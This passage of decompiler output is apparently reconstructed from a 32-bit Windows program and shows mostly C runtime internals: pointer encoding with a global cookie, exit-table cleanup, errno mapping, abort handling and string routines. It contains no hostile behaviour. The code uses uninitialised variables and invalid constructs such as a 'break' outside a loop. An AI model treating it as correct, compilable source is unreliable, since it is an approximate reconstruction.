            *v10 = 0;
            if (v18 != 0) {
                // 0x409fdc
                *v11 = 0;
                *v12 = 0;
                *(int32_t *)(v8 - 16) = 0;
                *(int32_t *)(v8 - 20) = 0;
                function_4096a0();
                return __asm_int3();
            }
            // 0x409f9b
            *(int32_t *)v20 = v17;
            v15 = v20 + 4;
            function_40bbdc(v15);
        }
        // 0x409fb1
        v19 = *(char *)v14;
        result2 = result;
    }
  lab_0x409fcb:
    // 0x409fcb
    *(int32_t *)(v8 - 4) = 0;
    function_40bbdc((int32_t)&g266);
    return result2;
}

// Address range: 0x409fe9 - 0x40a018
int32_t function_409fe9(int32_t a1) {
    if (a1 == 0) {
        // 0x40a015
        int32_t result; // 0x409fe9
        return result;
    }
    int32_t v1 = *(int32_t *)a1; // 0x409ff6
    int32_t v2; // bp-12, 0x409fe9
    int32_t * v3 = (int32_t *)((int32_t)&v2 - 4);
    int32_t v4 = a1; // 0x40a00b
    if (v1 == 0) {
        // 0x40a00d
        *v3 = a1;
        // 0x40a015
        return function_40bbdc((int32_t)&g266);
    }
    *v3 = v1;
    function_40bbdc((int32_t)&g266);
    v4 += 4;
    int32_t v5 = *(int32_t *)v4; // 0x40a006
    while (v5 != 0) {
        // 0x409ffd
        *v3 = v5;
        function_40bbdc((int32_t)&g266);
        v4 += 4;
        v5 = *(int32_t *)v4;
    }
    // 0x40a00d
    *v3 = a1;
    // 0x40a015
    return function_40bbdc((int32_t)&g266);
}

// Address range: 0x40a018 - 0x40a019
int32_t function_40a018(int32_t a1) {
    // 0x40a018
    int32_t result; // 0x40a018
    return result;
}

// Address range: 0x40a01a - 0x40a058
int32_t function_40a01a(int32_t a1) {
    int32_t v1; // 0x40a01a
    int32_t v2 = v1;
    int32_t v3; // bp-16, 0x40a01a
    *(int32_t *)((int32_t)&v3 - 4) = v2;
    function_4065bf();
    v1 = v2 + 4;
    // 0x40a01a
    int32_t v4; // 0x40a01a
    while (v2 != v4) {
        // 0x40a031
        v2 = v1;
        *(int32_t *)((int32_t)&v3 - 4) = v2;
        function_4065bf();
        v1 = v2 + 4;
    }
    // 0x40a046
    return function_4065ae();
}

// Address range: 0x40a05a - 0x40a073
int32_t function_40a05a(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x40a060
    int32_t result = v1; // 0x40a068
    if (v1 != g193) {
        // 0x40a06a
        result = function_409fe9(v1);
    }
    // 0x40a071
    return result;
}

// Address range: 0x40a075 - 0x40a08e
int32_t function_40a075(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x40a07b
    int32_t result = v1; // 0x40a083
    if (v1 != g192) {
        // 0x40a085
        result = function_409fe9(v1);
    }
    // 0x40a08c
    return result;
}

// Address range: 0x40a08e - 0x40a0c5
int32_t function_40a08e(void) {
    // 0x40a08e
    function_40a018(0x40a058);
    function_40a018(0x40a073);
    function_409fe9(g193);
    return function_409fe9(g192);
}

// Address range: 0x40a0c5 - 0x40a0ca
int32_t function_40a0c5(void) {
    // 0x40a0c5
    return function_409ebf();
}

// Address range: 0x40a0ca - 0x40a10c
int32_t function_40a0ca(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40a0ca
    function_406770(&g89, 12, (int32_t)&g266);
    int32_t v1; // 0x40a0ca
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40a0d6
    *v2 = 0;
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40a0e5
    *v3 = 0;
    *v2 = function_40a2dc();
    *v3 = -2;
    function_40a10f();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40a104
    return result;
}

// Address range: 0x40a10f - 0x40a11b
int32_t function_40a10f(void) {
    // 0x40a10f
    int32_t v1; // 0x40a10f
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40a11b - 0x40a15d
int32_t function_40a11b(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40a11b
    function_406770(&g90, 12, (int32_t)&g266);
    int32_t v1; // 0x40a11b
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40a127
    *v2 = 0;
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40a136
    *v3 = 0;
    *v2 = function_40a1bc();
    *v3 = -2;
    function_40a160();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40a155
    return result;
}

// Address range: 0x40a160 - 0x40a16c
int32_t function_40a160(void) {
    // 0x40a160
    int32_t v1; // 0x40a160
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40a16c - 0x40a194
int32_t function_40a16c(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x40a17a
    int32_t v2 = a1; // bp-16, 0x40a17d
    int32_t v3; // 0x40a16c
    return function_40a11b(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40a194 - 0x40a1bc
int32_t function_40a194(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40a1a2
    int32_t v2 = a1; // bp-16, 0x40a1a5
    int32_t v3; // 0x40a194
    return function_40a0ca(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40a1bc - 0x40a2dc
int32_t function_40a1bc(void) {
    // 0x40a1bc
    int32_t v1; // 0x40a1bc
    if (v1 == 0) {
        // 0x40a2cd
        return function_4065ae();
    }
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40a1f0
    uint32_t v3 = g112 & 31; // 0x40a1f3
    int32_t v4 = g112 ^ v1; // 0x40a1f6
    int32_t v5 = *v2 ^ g112; // 0x40a1fd
    int32_t v6 = v4; // 0x40a1ff
    int32_t v7 = v5; // 0x40a1ff
    if (v3 != 0) {
        uint32_t v8 = 32 - v3;
        v6 = v4 << v8 | v4 >> v3;
        v7 = v5 >> v3 | v5 << v8;
    }
    // .thread
    if (v6 < 1) {
        // 0x40a2cd
        return function_4065ae();
    }
    // 0x40a21a
    int32_t v9; // bp-40, 0x40a1bc
    int32_t * v10 = (int32_t *)((int32_t)&v9 - 4);
    int32_t v11 = v3; // 0x40a250
    int32_t v12 = v6;
    int32_t v13 = v7;
    uint32_t v14; // 0x40a1bc
    while (true) {
        int32_t v15 = v13;
        v14 = v12;
        *v10 = 32;
        uint32_t v16 = v11;
        int32_t v17 = v15 - 4; // 0x40a225
        if (v17 < v14) {
            // break (via goto) -> 0x40a28c
            goto lab_0x40a28c;
        }
        int32_t * v18 = (int32_t *)v17;
        int32_t v19 = *v18; // 0x40a22c
        int32_t v20 = v17; // 0x40a22e
        while (v19 == g112) {
            // 0x40a225
            v17 = v20 - 4;
            if (v17 < v14) {
                // break (via goto) -> 0x40a28c
                goto lab_0x40a28c;
            }
            // 0x40a22c
            v18 = (int32_t *)v17;
            v19 = *v18;
            v20 = v17;
        }
        int32_t v21 = v19 ^ g112; // 0x40a235
        int32_t v22 = v21; // 0x40a237
        if (v16 != 0) {
            v22 = v21 >> v16 | v21 << 32 - v16;
        }
        *v18 = g112;
        function_4065bf();
        int32_t v23 = g112; // 0x40a248
        v11 = v23 & 31;
        int32_t v24 = v23 ^ v22; // 0x40a25f
        int32_t v25 = *(int32_t *)(v22 + 4) ^ v23; // 0x40a264
        int32_t v26 = v24; // 0x40a268
        int32_t v27 = v25; // 0x40a268
        uint32_t v28; // 0x40a1bc
        if (v11 != 0) {
            v28 = 32 - v11;
            v26 = v24 << v28 | v24 >> v11;
            v27 = v25 >> v11 | v25 << v28;
        }
        // .thread3
        v13 = v27;
        v12 = v26;
        while (v12 == v14) {
            // 0x40a275
            *v10 = 32;
            int32_t v29 = v17; // 0x40a27b
            if (v13 != v15) {
                // break -> 0x40a280
                break;
            }
            v16 = v11;
            v17 = v29 - 4;
            if (v17 < v14) {
                // break (via goto) -> 0x40a28c
                goto lab_0x40a28c;
            }
            // 0x40a22c
            v18 = (int32_t *)v17;
            v19 = *v18;
            v20 = v17;
            while (v19 == v23) {
                // 0x40a225
                v17 = v20 - 4;
                if (v17 < v14) {
                    // break (via goto) -> 0x40a28c
                    goto lab_0x40a28c;
                }
                // 0x40a22c
                v18 = (int32_t *)v17;
                v19 = *v18;
                v20 = v17;
            }
            // 0x40a230
            v21 = v19 ^ v23;
            v22 = v21;
            if (v16 != 0) {
                v22 = v21 >> v16 | v21 << 32 - v16;
            }
            *v18 = v23;
            function_4065bf();
            v23 = g112;
            v11 = v23 & 31;
            v24 = v23 ^ v22;
            v25 = *(int32_t *)(v22 + 4) ^ v23;
            v26 = v24;
            v27 = v25;
            if (v11 != 0) {
                v28 = 32 - v11;
                v26 = v24 << v28 | v24 >> v11;
                v27 = v25 >> v11 | v25 << v28;
            }
            // .thread3
            v13 = v27;
            v12 = v26;
        }
    }
  lab_0x40a28c:
    if (v14 != -1) {
        // 0x40a291
        *v10 = v14;
        function_40bbdc((int32_t)&g266);
    }
    // 0x40a29e
    *v10 = 32;
    *(int32_t *)v1 = g112;
    *v2 = g112;
    *(int32_t *)(v1 + 8) = g112;
    // 0x40a2cd
    return function_4065ae();
}

// Address range: 0x40a2dc - 0x40a41d
int32_t function_40a2dc(void) {
    // 0x40a2dc
    int32_t v1; // 0x40a2dc
    if (v1 == 0) {
        // 0x40a418
        return -1;
    }
    uint32_t v2 = g112 & 31; // 0x40a304
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x40a308
    int32_t v4 = *v3 ^ g112; // 0x40a310
    int32_t v5 = *(int32_t *)(v1 + 8) ^ g112; // 0x40a312
    int32_t v6 = v4; // 0x40a314
    int32_t v7 = v5; // 0x40a314
    if (v2 != 0) {
        uint32_t v8 = 32 - v2;
        v6 = v4 >> v2 | v4 << v8;
        v7 = v5 >> v2 | v5 << v8;
    }
    int32_t v9 = v2; // 0x40a31c
    int32_t v10 = 0; // 0x40a31c
    int32_t v11 = v7; // 0x40a31c
    int32_t v12 = v6; // 0x40a31c
    int32_t v13; // 0x40a2dc
    int32_t v14; // 0x40a2dc
    uint32_t v15; // 0x40a329
    if (v6 != v7) {
        goto lab_0x40a3d6;
    } else {
        // 0x40a322
        v15 = v7 / 4;
        int32_t v16 = (v15 < 512 ? v15 : 512) + v15; // 0x40a332
        int32_t v17 = v16 != 0 ? v16 : 32;
        if (v17 < v15) {
            goto lab_0x40a35d;
        } else {
            int32_t v18 = function_40d2fc(0, v17, 4); // 0x40a344
            function_40bbdc(0);
            v13 = v18;
            v14 = v17;
            if (v18 != 0) {
                goto lab_0x40a385;
            } else {
                goto lab_0x40a35d;
            }
        }
    }
  lab_0x40a3d6:
    // 0x40a3d6
    *(int32_t *)v12 = function_4098fb(*(int32_t *)*v3);
    *(int32_t *)v9 = function_405b90(v10);
    *(int32_t *)(v9 + 4) = function_405b90(v12 + 4);
    *(int32_t *)(v9 + 8) = function_405b90(v11);
    // 0x40a418
    return 0;
  lab_0x40a35d:;
    int32_t v19 = v15 + 4; // 0x40a35f
    int32_t v20 = function_40d2fc(0, v19, 4); // 0x40a364
    function_40bbdc(0);
    v13 = v20;
    v14 = v19;
    if (v20 == 0) {
        // 0x40a418
        return -1;
    }
    goto lab_0x40a385;
  lab_0x40a385:;
    int32_t v21 = v13 + (v7 & -4); // 0x40a385
    int32_t v22 = 4 * v14 + v13; // 0x40a38d
    uint32_t v23 = 3 - v21 + v22; // 0x40a3b3
    v9 = v21;
    v10 = v13;
    v11 = v22;
    v12 = v21;
    if (v22 >= v21 && v23 >= 4) {
        int32_t v24 = 1; // 0x40a3cb
        *(int32_t *)v21 = g112;
        int32_t v25 = v21 + 4; // 0x40a3ce
        int32_t v26 = v24; // 0x40a3d4
        int32_t v27 = v25; // 0x40a3d4
        v9 = v25;
        v10 = v13;
        v11 = v22;
        v12 = v21;
        while (v24 != v23 / 4) {
            // 0x40a3cb
            v24 = v26 + 1;
            *(int32_t *)v27 = g112;
            v25 = v27 + 4;
            v26 = v24;
            v27 = v25;
            v9 = v25;
            v10 = v13;
            v11 = v22;
            v12 = v21;
        }
    }
    goto lab_0x40a3d6;
}

// Address range: 0x40a41d - 0x40a433
int32_t function_40a41d(int32_t a1, int32_t a2) {
    // 0x40a41d
    int32_t v1; // 0x40a41d
    return function_40a48d(&g194, a1, v1);
}

// Address range: 0x40a433 - 0x40a450
int32_t function_40a433(void) {
    // 0x40a433
    int32_t v1; // 0x40a433
    int32_t v2 = &v1; // bp-8, 0x40a43c
    int32_t v3; // 0x40a433
    return function_40a16c(2, &v2, &v1, v3);
}

// Address range: 0x40a450 - 0x40a48d
int32_t function_40a450(int32_t * a1) {
    // 0x40a450
    if (a1 == NULL) {
        // 0x40a48a
        return -1;
    }
    int32_t v1 = (int32_t)a1;
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40a464
    if (*a1 == *v2) {
        // 0x40a469
        *a1 = g112;
        *(int32_t *)(v1 + 4) = g112;
        *v2 = g112;
    }
    // 0x40a48a
    return 0;
}

// Address range: 0x40a48d - 0x40a4b1
int32_t function_40a48d(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x40a48d
    int32_t v1; // 0x40a48d
    int32_t v2 = &v1; // bp-12, 0x40a497
    int32_t v3; // 0x40a48d
    int32_t v4; // 0x40a48d
    return function_40a194(2, &v2, &v1, &v3, v4);
}

// Address range: 0x40a4b1 - 0x40a4c3
int32_t function_40a4b1(void) {
    // 0x40a4b1
    return function_409478((int32_t)&g122) & -256 | 1;
}

// Address range: 0x40a4c3 - 0x40a4dd
int32_t function_40a4c3(void) {
    // 0x40a4c3
    function_40a450(&g194);
    return function_40a450(&g195) & -256 | 1;
}

// Address range: 0x40a4dd - 0x40a4e5
int32_t function_40a4dd(void) {
    // 0x40a4dd
    return function_40a08e() & -256 | 1;
}

// Address range: 0x40a4e5 - 0x40a522
int32_t function_40a4e5(void) {
    // 0x40a4e5
    int32_t v1; // 0x40a4e5
    function_4095e4(g112, v1);
    function_4096de(g112);
    function_40d562(g112);
    function_40a5f4(g112);
    return function_409b35(g112) & -256 | 1;
}

// Address range: 0x40a522 - 0x40a52b
int32_t function_40a522(void) {
    // 0x40a522
    return function_406ef6(0);
}

// Address range: 0x40a52b - 0x40a5a2
int32_t function_40a52b(void) {
    int32_t v1 = (int32_t)g133 - 1; // 0x40a534
    *g133 = v1;
    if (v1 == 0) {
        // 0x40a53a
        if (g133 != &g131) {
            // 0x40a548
            function_40bbdc((int32_t)g133);
            *(int32_t *)&g133 = (int32_t)&g131;
        }
    }
    // 0x40a555
    function_40bbdc(g204);
    g204 = 0;
    function_40bbdc(g205);
    g205 = 0;
    function_40bbdc(g222);
    g222 = 0;
    int32_t v2 = function_40bbdc(g223); // 0x40a590
    g223 = 0;
    return v2 & -256 | 1;
}

// Address range: 0x40a5a2 - 0x40a5b4
int32_t function_40a5a2(void) {
    // 0x40a5a2
    return function_40d38f(&g32, &g33);
}

// Address range: 0x40a5b4 - 0x40a5c6
int32_t function_40a5b4(int32_t a1, int32_t a2) {
    // 0x40a5b4
    return function_40d412(&g32, &g33);
}

// Address range: 0x40a5c6 - 0x40a5cc
int32_t function_40a5c6(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40a5c6
    return g196;
}

// Address range: 0x40a5cc - 0x40a5db
int32_t function_40a5cc(int32_t result, int32_t a2) {
    // 0x40a5cc
    g196 = result;
    return result;
}

// Address range: 0x40a5db - 0x40a5f4
int32_t function_40a5db(void) {
    int32_t v1 = g197 ^ g112; // 0x40a5e2
    uint32_t v2 = g112 & 31; // 0x40a5e8
    int32_t v3 = v1; // 0x40a5eb
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    return v3 != 0;
}

// Address range: 0x40a5f4 - 0x40a608
int32_t function_40a5f4(int32_t a1) {
    // 0x40a5f4
    return function_409478(a1);
}

// Address range: 0x40a608 - 0x40a609
int32_t function_40a608(void) {
    // 0x40a608
    int32_t result; // 0x40a608
    return result;
}

// Address range: 0x40a60a - 0x40a651
int32_t function_40a60a(int32_t a1) {
    int32_t v1 = g197 ^ g112; // 0x40a621
    uint32_t v2 = g112 & 31; // 0x40a627
    int32_t v3 = v1; // 0x40a62a
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    if (v3 != 0) {
        // 0x40a634
        function_4065bf();
    }
    // 0x40a642
    return function_4065ae();
}

// Address range: 0x40a651 - 0x40a666
int32_t function_40a651(int32_t a1) {
    int32_t result = function_4098fb(a1); // 0x40a659
    g197 = result;
    return result;
}

// Address range: 0x40a666 - 0x40a6b9
int32_t function_40a666(void) {
    // 0x40a666
    function_40ce86();
    char * v1 = g224; // 0x40a66f
    int32_t v2 = 0; // 0x40a67e
    int32_t v3 = v1 != NULL ? (int32_t)v1 : (int32_t)&g198; // 0x40a67e
    int32_t v4; // 0x40a666
    int32_t result; // 0x40a666
    while (true) {
        int32_t v5 = v3;
        int32_t v6 = v2;
        char v7 = *(char *)v5; // 0x40a680
        if (v7 > 32) {
            // 0x40a68e
            v2 = v6;
            if (v7 == 34) {
                // 0x40a692
                v2 = (char)v6 == 0;
            }
        } else {
            // 0x40a686
            result = v5;
            if (v7 == 0) {
                // break -> 0x40a6b4
                break;
            }
            // 0x40a68a
            v2 = v6;
            v4 = v5;
            if ((char)v6 == 0) {
                goto lab_0x40a6ad;
            }
        }
        // 0x40a697
        int32_t v8; // bp-8, 0x40a666
        *(int32_t *)((int32_t)&v8 - 4) = (int32_t)v7;
        v3 = v5 + 1 + (int32_t)(function_40d211((int32_t)&g266) != 0);
    }
    // 0x40a6b4
    return result;
  lab_0x40a6ad:;
    int32_t v9 = v4 + 1; // 0x40a6ad
    char v10 = *(char *)v9; // 0x40a6ae
    v4 = v9;
    result = v9;
    if (v10 == 0 || v10 > 32) {
        return result;
    } else {
        goto lab_0x40a6ad;
    }
}

// Address range: 0x40a6b9 - 0x40a715
int32_t function_40a6b9(int32_t * a1, int32_t * a2) {
    int32_t v1 = (int32_t)a1;
    uint32_t v2 = 3 - v1 + (int32_t)a2; // 0x40a6d4
    int32_t v3 = v1; // 0x40a6e6
    if (a2 < a1 || v2 < 4) {
        // 0x40a704
        return function_4065ae();
    }
    int32_t v4 = 0; // 0x40a6e6
    if (*(int32_t *)v3 != 0) {
        // 0x40a6f1
        function_4065bf();
    }
    // 0x40a6fc
    v4++;
    v3 += 4;
    while (v4 != v2 / 4) {
        // 0x40a6e8
        if (*(int32_t *)v3 != 0) {
            // 0x40a6f1
            function_4065bf();
        }
        // 0x40a6fc
        v4++;
        v3 += 4;
    }
    // 0x40a704
    return function_4065ae();
}

// Address range: 0x40a715 - 0x40a75a
int32_t function_40a715(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40a74a
        return function_4065ae();
    }
    int32_t v1 = (int32_t)a1; // 0x40a740
    if (*(int32_t *)v1 != 0) {
        // 0x40a732
        if (function_4065bf() != 0) {
            // break -> 0x40a74a
            break;
        }
    }
    // 0x40a740
    v1 += 4;
    while (v1 != (int32_t)a2) {
        // 0x40a72c
        if (*(int32_t *)v1 != 0) {
            // 0x40a732
            if (function_4065bf() != 0) {
                // break -> 0x40a74a
                break;
            }
        }
        // 0x40a740
        v1 += 4;
    }
    // 0x40a74a
    return function_4065ae();
}

// Address range: 0x40a75a - 0x40a797
int32_t function_40a75a(int32_t a1) {
    switch (a1) {
        case 0x10000: {
        }
        case 0x8000: {
        }
        case 0x4000: {
            // 0x40a78c
            g232 = a1;
            return 0;
        }
    }
    // 0x40a777
    *(int32_t *)function_40ab11() = 22;
    return 22;
}

// Address range: 0x40a797 - 0x40a7a2
int32_t function_40a797(void) {
    int32_t result = g199; // 0x40a79f
    g199 = 1;
    return result;
}

// Address range: 0x40a7a2 - 0x40a7eb
int32_t function_40a7a2(void) {
    // 0x40a7a2
    function_406770(&g91, 8, (int32_t)&g266);
    if (g206 != (int32_t)&g122) {
        // 0x40a7bb
        function_40bfa7(4);
        int32_t v1; // 0x40a7a2
        int32_t * v2 = (int32_t *)(v1 - 4); // 0x40a7c3
        *v2 = 0;
        g206 = function_40e13b(&g206, (int32_t)&g122);
        *v2 = -2;
        function_40a7eb();
    }
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40a7e5
    return result;
}

// Address range: 0x40a7eb - 0x40a7f4
int32_t function_40a7eb(void) {
    // 0x40a7eb
    return function_40bfef(4);
}

// Address range: 0x40a7f4 - 0x40a856
int32_t function_40a7f4(int32_t a1) {
    int32_t * v1 = (int32_t *)(function_40ba33() + 848); // 0x40a807
    int32_t v2 = *v1; // 0x40a807
    int32_t result = (v2 & 2) == 0 ? 2 : 1; // 0x40a813
    int32_t v3; // 0x40a7f4
    switch (a1) {
        case -1: {
            // 0x40a84c
            g139 = -1;
            // 0x40a853
            return result;
        }
        case 0: {
            // 0x40a853
            return result;
        }
        case 1: {
            // 0x40a841
            v3 = v2 | 2;
            // break -> 0x40a844
            break;
        }
        case 2: {
            // 0x40a83c
            v3 = v2 & -3;
            // break -> 0x40a844
            break;
        }
        default: {
            // 0x40a827
            *(int32_t *)function_40ab11() = 22;
            // 0x40a853
            return -1;
        }
    }
    // 0x40a844
    *v1 = v3;
    // 0x40a853
    return result;
}

// Address range: 0x40a856 - 0x40a85c
int32_t function_40a856(void) {
    // 0x40a856
    return g200;
}

// Address range: 0x40a85c - 0x40a88b
int32_t function_40a85c(uint32_t a1) {
    if (a1 >= 2) {
        // 0x40a86d
        *(int32_t *)function_40ab11() = 22;
        return -1;
    }
    int32_t result = g200; // 0x40a887
    g200 = a1;
    return result;
}

// Address range: 0x40a88b - 0x40a891
int32_t function_40a88b(void) {
    // 0x40a88b
    return &g201;
}

// Address range: 0x40a891 - 0x40a896
int32_t function_40a891(void) {
    // 0x40a891
    return function_40bbdc((int32_t)&g266);
}

// Address range: 0x40a896 - 0x40a8d1
int32_t function_40a896(void) {
    // 0x40a896
    function_4113c0(&g92, 12, (int32_t)&g266);
    if (*(int32_t *)(function_40ba33() + 12) != 0) {
        // 0x40a8ae
        int32_t v1; // 0x40a896
        int32_t * v2 = (int32_t *)(v1 - 4); // 0x40a8ae
        *v2 = 0;
        function_4065bf();
        *v2 = -2;
    }
    // 0x40a8cc
    function_40a98b();
    // UNREACHABLE
}

// Address range: 0x40a8d4 - 0x40a931
int32_t function_40a8d4(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a8d4
    int32_t v1; // 0x40a8d4
    int32_t v2; // 0x40a8d4
    if ((a2 & -0x30f0320 & a3) == 0) {
        int32_t v3 = function_40e236(a2, a3 & -0x80001, v1, v2);
        if (a1 != 0) {
            // 0x40a91c
            *(int32_t *)a1 = v3;
        }
        // 0x40a92e
        return 0;
    }
    if (a1 != 0) {
        // 0x40a8f4
        *(int32_t *)a1 = function_40e236(0, 0, v1, v2);
    }
    // 0x40a901
    *(int32_t *)function_40ab11() = 22;
    // 0x40a92e
    return 22;
}

// Address range: 0x40a931 - 0x40a98b
int32_t function_40a931(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1; // 0x40a931
    int32_t result; // 0x40a931
    if (a1 == 0 || a2 == 0) {
        goto lab_0x40a94f;
    } else {
        if (a3 != 0) {
            int32_t v2 = a2; // 0x40a966
            int32_t v3 = a1; // 0x40a966
            char v4 = *(char *)(a3 - a1 + v3); // 0x40a968
            *(char *)v3 = v4;
            int32_t v5 = v2; // 0x40a970
            while (v4 != 0) {
                // 0x40a972
                v2--;
                v3++;
                v5 = v2;
                if (v2 == 0) {
                    // break -> 0x40a977
                    break;
                }
                v4 = *(char *)(a3 - a1 + v3);
                *(char *)v3 = v4;
                v5 = v2;
            }
            // 0x40a977
            if (v5 != 0) {
                // 0x40a95e
                return 0;
            }
            // 0x40a97c
            *(char *)a1 = (char)v5;
            v1 = function_40ab11();
            result = 34;
            goto lab_0x40a956;
        } else {
            // 0x40a94c
            *(char *)a1 = 0;
            goto lab_0x40a94f;
        }
    }
  lab_0x40a94f:
    // 0x40a94f
    v1 = function_40ab11();
    result = 22;
    goto lab_0x40a956;
  lab_0x40a956:
    // 0x40a956
    *(int32_t *)v1 = result;
    // 0x40a95e
    return result;
}

// Address range: 0x40a98b - 0x40a9cd
int32_t function_40a98b(void) {
    // 0x40a98b
    int32_t v1; // 0x40a98b
    int32_t v2; // bp-4, 0x40a98b
    if (function_40d54b() != 0) {
        // 0x40a994
        v2 = 22;
        function_40d5a6(22);
        int32_t v3; // 0x40a98b
        v1 = &v3;
    }
    // 0x40a99c
    if ((g117 & 2) == 0) {
        // 0x40a9c6
        *(int32_t *)(v1 - 4) = 3;
        function_409b62((int32_t)&g266);
        // UNREACHABLE
    }
    // 0x40a9a5
    v2 = 23;
    if (IsProcessorFeaturePresent(23)) {
        // 0x40a9b0
        __asm_int(41);
    }
    // 0x40a9b5
    function_4094a9(3, 0x40000015, 1, (int32_t)&g266);
    // 0x40a9c6
    *(int32_t *)((int32_t)&v2 - 4) = 3;
    function_409b62((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x40a9d0 - 0x40a9d9
int32_t function_40a9d0(void) {
    // 0x40a9d0
    return function_40c4a1((int32_t)&g266, (int32_t)&g266);
}

// Address range: 0x40a9d9 - 0x40aa13
int32_t function_40a9d9(int32_t a1, int32_t a2, int32_t result) {
    if (result == 0) {
        // 0x40a9e5
        return result;
    }
    int32_t v1 = result - 1; // 0x40a9ee
    int32_t v2 = v1; // 0x40a9f1
    int32_t v3 = a1; // 0x40a9f1
    if (v1 == 0) {
        // 0x40aa08
        return (int32_t)*(int16_t *)a1 - (int32_t)*(int16_t *)a2;
    }
    int32_t v4 = a2; // 0x40a9f1
    int16_t v5 = *(int16_t *)v3; // 0x40a9f3
    while (v5 != 0) {
        // 0x40a9fb
        if (*(int16_t *)v4 != v5) {
            // break -> 0x40aa08
            break;
        }
        // 0x40aa00
        v3 += 2;
        v4 += 2;
        v2--;
        if (v2 == 0) {
            // break -> 0x40aa08
            break;
        }
        v5 = *(int16_t *)v3;
    }
    // 0x40aa08
    return (int32_t)*(int16_t *)v3 - (int32_t)*(int16_t *)v4;
}

// Address range: 0x40aa20 - 0x40aa98
int32_t function_40aa20(int32_t a1, int32_t a2, int32_t a3) {
    if (a3 == 0) {
        // 0x40aa86
        return 0;
    }
    int32_t v1 = a1 - a2; // 0x40aa36
    int32_t v2 = a2; // 0x40aa3e
    int32_t v3 = a3; // 0x40aa3e
    int32_t v4 = a2; // 0x40aa3e
    int32_t v5 = a3; // 0x40aa3e
    if ((a2 & 3) == 0) {
      lab_0x40aa57:;
        int32_t v6 = v5;
        int32_t v7 = v4;
        int32_t v8 = v7 + v1; // 0x40aa57
        v2 = v7;
        v3 = v6;
        while ((v8 & 4095) < 4093) {
            int32_t v9 = *(int32_t *)v8; // 0x40aa66
            v2 = v7;
            v3 = v6;
            if (v9 != *(int32_t *)v7) {
                // break -> 0x40aa40
                break;
            }
            int32_t v10 = v6 - 4; // 0x40aa6d
            if (v6 < 4 || v10 == 0) {
                // 0x40aa86
                return 0;
            }
            // 0x40aa72
            if (((v9 & -0x7f7f7f80 ^ -0x7f7f7f80) & v9 - 0x1010101) != 0) {
                // 0x40aa86
                return 0;
            }
            v6 = v10;
            v7 += 4;
            v8 = v7 + v1;
            v2 = v7;
            v3 = v6;
        }
    }
    int32_t v11 = v2; // 0x40aa4c
    int32_t v12 = v3; // 0x40aa4d
    unsigned char v13 = *(char *)(v11 + v1); // 0x40aa40
    unsigned char v14 = *(char *)v11; // 0x40aa44
    while (v13 == v14) {
        if (v13 == 0) {
            // 0x40aa86
            return 0;
        }
        int32_t v15 = v12;
        v12 = v15 - 1;
        if (v15 == 0 || v12 == 0) {
            // 0x40aa86
            return 0;
        }
        // 0x40aa52
        v11++;
        v4 = v11;
        v5 = v12;
        if ((v11 & 3) == 0) {
            goto lab_0x40aa57;
        }
        v13 = *(char *)(v11 + v1);
        v14 = *(char *)v11;
    }
    // 0x40aa90
    return v13 < v14 ? -1 : 1;
}

// Address range: 0x40aa98 - 0x40aadb
int32_t function_40aa98(int32_t a1) {
    int32_t v1 = 0; // 0x40aaa0
    int32_t v2 = 8 * v1; // 0x40aaa2
    while (*(int32_t *)(v2 + (int32_t)&g33) != a1) {
        // 0x40aaab
        v1++;
        if (v1 >= 45) {
            if (a1 < 37) {
                // 0x40aab9
                return 13;
            }
            // 0x40aabe
            return a1 > 202 ? 22 : 8;
        }
        v2 = 8 * v1;
    }
    // 0x40aad2
    return *(int32_t *)(v2 + (int32_t)&g34);
}

// Address range: 0x40aadb - 0x40aadc
int32_t function_40aadb(void) {
    // 0x40aadb
    int32_t result; // 0x40aadb
    return result;
}

// Address range: 0x40aadd - 0x40aafe
int32_t function_40aadd(int32_t a1) {
    // 0x40aadd
    *(int32_t *)function_40aafe() = a1;
    int32_t v1 = function_40aa98(a1); // 0x40aaec
    int32_t result = function_40ab11(); // 0x40aaf4
    *(int32_t *)result = v1;
    return result;
}

// Address range: 0x40aafe - 0x40ab11
int32_t function_40aafe(void) {
    int32_t v1 = function_40bab7(); // 0x40aafe
    if (v1 != 0) {
        // 0x40ab0d
        return v1 + 20;
    }
    // 0x40ab07
    return &g119;
}

// Address range: 0x40ab11 - 0x40ab24
int32_t function_40ab11(void) {
    int32_t v1 = function_40bab7(); // 0x40ab11
    if (v1 != 0) {
        // 0x40ab20
        return v1 + 16;
